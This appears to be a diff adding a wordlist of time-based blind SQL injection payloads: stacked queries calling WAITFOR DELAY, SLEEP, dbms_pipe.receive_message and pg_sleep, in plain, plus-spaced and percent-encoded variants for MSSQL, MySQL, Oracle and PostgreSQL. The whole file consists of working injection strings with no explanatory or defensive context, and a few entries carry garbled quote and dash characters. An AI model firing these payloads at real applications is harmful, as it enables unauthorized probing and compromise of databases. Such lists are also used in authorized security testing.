@@ -1,0 +1,37 @@
+';WAITFOR DELAY ‘0:0:10’— -
+'%3bWAITFOR DELAY '0:0:10'-- -
+";WAITFOR DELAY '0:0:10'-- -
+"%3bWAITFOR DELAY '0:0:10'-- -
+';SELECT SLEEP(10)-- -
+";SELECT SLEEP(10)-- -
+'%3bSELECT SLEEP(10)-- -
+"%3bSELECT SLEEP(10)-- -
+';dbms_pipe.receive_message(('a'),10)-- -
+'%3bdbms_pipe.receive_message(('a'),10)-- -
+"%3bdbms_pipe.receive_message(('a'),10)-- -
+';SELECT pg_sleep(10)-- -
+";SELECT pg_sleep(10)-- -
+'%3bSELECT pg_sleep(10)-- -
+"%3bSELECT pg_sleep(10)-- -
+‘;WAITFOR+DELAY+‘0:0:10’—+-
+'%3bWAITFOR+DELAY+'0:0:10'--+-
+";WAITFOR+DELAY+'0:0:10'--+-
+"%3bWAITFOR+DELAY+'0:0:10'--+-
+';SELECT+SLEEP(10)--+-
+";SELECT+SLEEP(10)--+-
+'%3bSELECT+SLEEP(10)--+-
+"%3bSELECT+SLEEP(10)--+-
+';dbms_pipe.receive_message(('a'),10)--+-
+'%3bdbms_pipe.receive_message(('a'),10)--+-
+"%3bdbms_pipe.receive_message(('a'),10)--+-
+';SELECT+pg_sleep(10)--+-
+";SELECT+pg_sleep(10)-- -
+'%3bSELECT+pg_sleep(10)--+-
+"%3bSELECT+pg_sleep(10)--+-
+%18%3b%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%18%30%3a%30%3a%31%30%19%14%20%2d
+%22%3b%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%31%30%27%2d%2d%20%2d
+%27%3b%53%45%4c%45%43%54%20%53%4c%45%45%50%28%31%30%29%2d%2d%20%2d
+%22%3b%53%45%4c%45%43%54%20%53%4c%45%45%50%28%31%30%29%2d%2d%20%2d
+%27%3b%64%62%6d%73%5f%70%69%70%65%2e%72%65%63%65%69%76%65%5f%6d%65%73%73%61%67%65%28%28%27%61%27%29%2c%31%30%29%2d%2d%20%2d
+%27%3b%53%45%4c%45%43%54%20%70%67%5f%73%6c%65%65%70%28%31%30%29%2d%2d%20%2d
+%22%3b%53%45%4c%45%43%54%20%70%67%5f%73%6c%65%65%70%28%31%30%29%2d%2d%20%2d
